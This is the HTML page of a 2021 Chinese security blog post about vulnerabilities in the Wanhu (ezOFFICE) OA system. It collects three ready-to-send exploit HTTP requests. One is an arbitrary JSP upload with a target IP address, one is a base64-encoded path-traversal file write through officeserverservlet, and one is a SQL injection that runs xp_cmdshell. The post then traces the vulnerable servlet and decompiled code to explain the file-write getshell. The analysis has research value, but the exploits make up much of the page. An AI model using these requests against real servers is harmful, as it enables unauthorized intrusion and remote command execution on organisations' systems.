<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>万户OA-漏洞分析 | ChongMeng</title>
<link rel="shortcut icon" href="https://1946dream.github.io//favicon.ico?v=1629210696829">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://1946dream.github.io//styles/main.css">
<link rel="alternate" type="application/atom+xml" title="万户OA-漏洞分析 | ChongMeng - Atom Feed" href="https://1946dream.github.io//atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="😀漏洞

EXP均为网上搜集
https://www.t00ls.net/viewthread.php?tid=62018&amp;extra=&amp;page=1
https://forum.butian.net/share/359
..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://1946dream.github.io/">
  <img class="avatar" src="https://1946dream.github.io//images/avatar.png?v=1629210696829" alt="">
  </a>
  <h1 class="site-title">
    ChongMeng
  </h1>
  <p class="site-description">
    让我记住你的美。
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              万户OA-漏洞分析
            </h2>
            <div class="post-info">
              <span>
                2021-08-14
              </span>
              <span>
                11 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h1 id="漏洞">😀漏洞</h1>
<blockquote>
<p>EXP均为网上搜集<br>
https://www.t00ls.net/viewthread.php?tid=62018&amp;extra=&amp;page=1<br>
https://forum.butian.net/share/359</p>
</blockquote>
<h2 id="getshell-1">😀Getshell-1：</h2>
<h4 id="expshell路径为defaultrootuploadhtml">EXP:(shell路径为：/defaultroot/upload/html/)</h4>
<pre><code>POST /defaultroot/upload/fileUpload.controller HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
Content-Length: 227
Content-Type: multipart/form-data; boundary=6xrJHl3JpNbrIj1jgGga21ogG3mfWzvisgB
Host: 218.56.135.226:7001
Connection: close

--6xrJHl3JpNbrIj1jgGga21ogG3mfWzvisgB
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.jsp&quot;
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

123
--6xrJHl3JpNbrIj1jgGga21ogG3mfWzvisgB--
</code></pre>
<h2 id="getshell-2">😀Getshell-2：</h2>
<h4 id="expshell路径为httpipdefaultroot1txt">EXP:(shell路径为：http://IP/defaultroot/1.txt)</h4>
<pre><code>POST /defaultroot/officeserverservlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OASESSIONID=52142AC4FD797FAF815BCBEA7872A355; LocLan=zh_CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 244

DBSTEP V3.0     170              0                9              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vMS50eHQ=
111111111111111111111111111111111111111111111111
test123
</code></pre>
<h2 id="高权限用户sql注入-3">😀高权限用户sql注入-3：</h2>
<h4 id="exp">EXP:</h4>
<pre><code>POST /defaultroot/Graph!showResult.action HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://ip:port
Connection: close
Referer: http://ip:port/defaultroot/Graph!runSql.action
Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1
Upgrade-Insecure-Requests: 1

database=localDataSource&amp;dataSQL=exec+master..xp_cmdshell+&quot;ipconfig&quot;;
</code></pre>
<h1 id="漏洞分析-getshell">🤓漏洞分析-Getshell</h1>
<p>先看EXP,我们根据EXP进行跟踪。</p>
<pre><code>POST /defaultroot/officeserverservlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OASESSIONID=52142AC4FD797FAF815BCBEA7872A355; LocLan=zh_CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 244

DBSTEP V3.0     170              0                9              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vMS50eHQ=
111111111111111111111111111111111111111111111111
test123
</code></pre>
<p>先从DBSTEP V3.0 这个我也不知道为啥要这么传，然后看 POST DATA头部参数，发现170参数是代表了从报文什么地方开始读取，参数 9 代表了写入内容的大小。<br>
下面我们看 OPTION参数 对应的base64解密为SAVEFILE<br>
查看源代码我们发现(截取核心片段)</p>
<pre><code>try{
    if (request.getMethod().equalsIgnoreCase(&quot;POST&quot;)){
      MsgObj.MsgVariant(ReadPackage(request));
      if (MsgObj.GetMsgByName(&quot;DBSTEP&quot;).equalsIgnoreCase(&quot;DBSTEP&quot;)){	//如果是合法的信息包
        mOption=MsgObj.GetMsgByName(&quot;OPTION&quot;) ;							//取得操作信息
        mUserName=MsgObj.GetMsgByName(&quot;USERNAME&quot;) ;						//取得系统用户
        System.out.println(mOption);									//打印出调试信息
</code></pre>
<p>首先会判断我们的请求方式是否为 POST ，第三行好像是从request获取内容，然后利用 GetmsgByname函数获取 DBSTEP参数的值与DBSTEP对比查看是否一致，我们查看我们得知 REJTVEVQ base64解码后为DBSTEP，然后进入条件内。获取 OPTION的值，base64解码U0FWRUZJTEU = SAVEFILE 然后赋值给mOption。全局搜索进入 SAVAFILE分支内，代码如下。</p>
<pre><code> else if(mOption.equalsIgnoreCase(&quot;SAVEFILE&quot;)){					//下面的代码为保存文件在服务器的数据库里

          mRecordID=MsgObj.GetMsgByName(&quot;RECORDID&quot;);		    //取得文档编号
          mFileName=MsgObj.GetMsgByName(&quot;FILENAME&quot;);		    //取得文档名称
          mFileType=MsgObj.GetMsgByName(&quot;FILETYPE&quot;);		    //取得文档类型
          mFileSize=MsgObj.MsgFileSize();			    //取得文档大小
          mFileDate=DbaObj.GetDateTime();                           //取得文档时间
          mFileBody=MsgObj.MsgFileBody();			    //取得文档内容
          //mFilePath=&quot;&quot;;                                             //如果保存为文件，则填写文件路径
          mUserName=mUserName;                                      //取得保存用户名称
          //mMyDefine1=MsgObj.GetMsgByName(&quot;MyDefine1&quot;);            //取得客户端传递变量值 MyDefine1=&quot;自定义变量值1&quot;
		  String isDoc=MsgObj.GetMsgByName(&quot;isDoc&quot;);//是否保存为doc文档
		  String moduleType=MsgObj.GetMsgByName(&quot;moduleType&quot;);//模块类型
		  String docName=MsgObj.GetMsgByName(&quot;docName&quot;);//文件保存名
          mDescript=&quot;通用版本&quot;;                                 	    //版本说明
	  	  MsgObj.MsgTextClear();				    //清除文本信息
		  //--zhuo
</code></pre>
<p>RECORDID=<br>
isDoc=true<br>
moduleType=govdocument<br>
FILETYPE=../../1.txt<br>
111111111111111111111111111111111111111111111111<br>
test123</p>
<pre><code>if(isDoc.equals(&quot;false&quot;)){
			  if (SaveFile()) 					    //保存文档内容
			  {
				MsgObj.SetMsgByName(&quot;STATUS&quot;, &quot;保存成功!&quot;);	            //设置状态信息
				MsgObj.MsgError(&quot;&quot;);				    //清除错误信息
			  }
			  else
			  {
				MsgObj.MsgError(&quot;保存失败!&quot;);			            //设置错误信息
			  }
		  }
		  else if(isDoc.equals(&quot;true&quot;)){
			 String myPath=mFilePath+&quot;//iWebOfficeSign//Document&quot;;
			 if(moduleType.equals(&quot;information&quot;)){
				myPath=mFilePath+&quot;//upload//information&quot;;
			 }else if(moduleType.equals(&quot;govdocument&quot;)){
				myPath=mFilePath+&quot;//upload//govdocumentmanager&quot;;

              }else if(moduleType.indexOf(&quot;dossier&quot;)&gt;-1){//紫金 矿业  归档 时 用！
              myPath=mFilePath+&quot;//upload//dossier&quot;+&quot;//sendType&quot;+moduleType.substring(moduleType.indexOf(&quot;dossier&quot;)+7); 
			 try {       
                    java.io.File myFilePath = new java.io.File(myPath);
                    if (!myFilePath.exists()) {
                        myFilePath.mkdir();
                    }
                } catch (Exception e) {
                    System.out.println(&quot;新建目录操作出错&quot;);
                    e.printStackTrace();
                }
			 }
</code></pre>
<p>对 isdoc参数进行了判断，我们跟如条件 true。</p>
<pre><code>else if(isDoc.equals(&quot;true&quot;)){
			 String myPath=mFilePath+&quot;//iWebOfficeSign//Document&quot;;
			 if(moduleType.equals(&quot;information&quot;)){
				myPath=mFilePath+&quot;//upload//information&quot;;
			 }else if(moduleType.equals(&quot;govdocument&quot;)){
				myPath=mFilePath+&quot;//upload//govdocumentmanager&quot;;

              }else if(moduleType.indexOf(&quot;dossier&quot;)&gt;-1){//紫金 矿业  归档 时 用！
              myPath=mFilePath+&quot;//upload//dossier&quot;+&quot;//sendType&quot;+moduleType.substring(moduleType.indexOf(&quot;dossier&quot;)+7); 
			 try {       
                    java.io.File myFilePath = new java.io.File(myPath);
                    if (!myFilePath.exists()) {
                        myFilePath.mkdir();
                    }
                } catch (Exception e) {
                    System.out.println(&quot;新建目录操作出错&quot;);
                    e.printStackTrace();
                }
			 }
</code></pre>
<p>mFilePath = request.getSession().getServletContext().getRealPath(&quot;&quot;) ;  //取得服务器路径 （对于java不熟悉就猜测这里是获取网站绝对路径)<br>
接下来对 moduleType 进行了判断，我们传入的值为 govdocument 所以<br>
myPath = 绝对路径+//upload//govdocumentmanager<br>
查看第13行，判断文件夹是否存在，不存在则 创建文件夹。</p>
<pre><code>//
			 System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);
			 System.out.println(mFileType);
		   	 System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;); 
			 if(moduleType.indexOf(&quot;dossier&quot;)&gt;-1){//紫金 矿业  归档 时 用！
			  MsgObj.MsgFileSave(myPath + &quot;//&quot; + docName +&quot;(带痕)&quot;+ mFileType);
			 }else{
			 MsgObj.MsgFileSave(myPath + &quot;//&quot; + mRecordID + mFileType);
			 
			 }
                /*------用ftp把保存的doc文件上传到文件服务器------------*/
 		   if(sysMap != null &amp;&amp; sysMap.get(&quot;附件上传&quot;) != null &amp;&amp; sysMap.get(&quot;附件上传&quot;).toString().equals(&quot;0&quot;)&amp;&amp;(moduleType.indexOf(&quot;dossier&quot;)&lt;0)){//紫金 矿业  归档 时  不上传
		        java.util.Map ftpMap = (java.util.Map) request.getSession().getAttribute(&quot;ftpMap&quot;);
//System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);
//		        System.out.println(ftpMap.get(&quot;server&quot;).toString());
//				System.out.println(ftpMap.get(&quot;user&quot;).toString());
//				System.out.println(ftpMap.get(&quot;oriPass&quot;) + &quot;whir?!&quot;);
//				System.out.println(myPath + &quot;//&quot; + mRecordID + &quot;.doc&quot;);
//				System.out.println(moduleType.equals(&quot;information&quot;)?&quot;information&quot;:&quot;govdocumentmanager&quot;);
//System.out.println(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);
				//com.whir.common.util.FtpClientTest ftpClient = new com.whir.common.util.FtpClientTest(ftpMap.get(&quot;server&quot;).toString(), ftpMap.get(&quot;user&quot;).toString(), ftpMap.get(&quot;oriPass&quot;) + &quot;whir?!&quot;,myPath + &quot;//&quot; + mRecordID + mFileType,mRecordID + mFileType,moduleType.equals(&quot;information&quot;)?&quot;information&quot;:&quot;govdocumentmanager&quot;);
		        //ftpClient.upload();
		    }
/*------------------------------------------------------*/
          	//----------------------------------------
          	/*try{
          		byte[] buff = new byte[256];
          		java.io.File myFile = new java.io.File(&quot;config/ky.prop&quot;);
          		java.io.FileInputStream fis = new java.io.FileInputStream(myFile);
            	fis.read(buff);
            	String str = new String(buff);
            	str = str.trim();
            	String[] tmp = str.split(((char) 10) + &quot;&quot;);
            	String myPath = tmp[4].trim();
            	MsgObj.MsgFileSave(myPath + &quot;//&quot; + mRecordID + &quot;.doc&quot;);
          	}catch(Exception e){}*/
          	//----------------------------------------
		  }

          MsgObj.MsgFileClear();                                    //清除文档内容
        }
</code></pre>
<p>这里我们观察第九行，<br>
MsgObj.MsgFileSave(myPath + &quot;//&quot; + mRecordID + mFileType);<br>
mypath + &quot;//&quot; +mRecoreID + mFileType 最终拼接后为<br>
绝对路径+//upload//govdocumentmanager//../../1.txt<br>
最终路径为 网站绝对路径/1.txt<br>
MsgFileSave函数传入了一个路径，我们跟进这个函数由于不在当前jsp文件中，我们利用java反编译工具反编译iMsgServer2000.class文件得到源码。<br>
GetMsgByName函数源码</p>
<pre><code>public String GetMsgByName(String FieldName) {
        String mReturn = &quot;&quot;;
        String mFieldName = FieldName.trim().concat(&quot;=&quot;);
        int i = this._$290.indexOf(mFieldName);
        if (i != -1) {
            int j = this._$290.indexOf(&quot;\r\n&quot;, i + 1);
            int i2 = i + mFieldName.length();
            if (j != -1) {
                String mReturn2 = DecodeBase64(this._$290.substring(i2, j));
                String str = mReturn2;
                return mReturn2;
            }
            String str2 = mReturn;
            return mReturn;
        }
        String str3 = mReturn;
        return mReturn;
    }
</code></pre>
<p>所以我们字符串需要传入base64编码。<br>
MsgFileSave函数源码</p>
<pre><code>    public boolean MsgFileSave(String FileName) {
        int BlockSize = this.BuffSize * 1024;
        long FileSize = this._$289.length();
        try {
            FileOutputStream mFile = new FileOutputStream(FileName);
            FileInputStream mThis = new FileInputStream(this._$289);
            byte[] BlockBuf = new byte[BlockSize];
            while (FileSize &gt; 0) {
                int CurSize = mThis.read(BlockBuf, 0, BlockSize);
                mFile.write(BlockBuf, 0, CurSize);
                FileSize -= (long) CurSize;
            }
            mThis.close();
            mFile.close();
            return true;
        } catch (Exception e) {
            this._$291 = new StringBuffer().append(this._$291).append(e.toString()).toString();
            System.out.println(e.toString());
            return false;
        }
    }
</code></pre>
<p>我们有时候在跟 this._$289是什么函数，假设猜测 BlockBuf就是我们传入的170，BlockSize 就是我们传入的9<br>
然后写到 我们传入的 Filename 文件路径内。造成文件上传Getshell</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E6%BC%8F%E6%B4%9E">😀漏洞</a>
<ul>
<li><a href="#getshell-1">😀Getshell-1：</a><br>
*
<ul>
<li><a href="#expshell%E8%B7%AF%E5%BE%84%E4%B8%BAdefaultrootuploadhtml">EXP:(shell路径为：/defaultroot/upload/html/)</a></li>
</ul>
</li>
<li><a href="#getshell-2">😀Getshell-2：</a><br>
*
<ul>
<li><a href="#expshell%E8%B7%AF%E5%BE%84%E4%B8%BAhttpipdefaultroot1txt">EXP:(shell路径为：http://IP/defaultroot/1.txt)</a></li>
</ul>
</li>
<li><a href="#%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7sql%E6%B3%A8%E5%85%A5-3">😀高权限用户sql注入-3：</a><br>
*
<ul>
<li><a href="#exp">EXP:</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-getshell">🤓漏洞分析-Getshell</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://1946dream.github.io/post/mou-shan-v9zhong-duan-an-quan-xi-tong-chan-pin/">
              <h3 class="post-title">
                某山V9+终端安全任意文件上传
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  让我记住你的美。
  <a class="rss" href="https://1946dream.github.io//atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
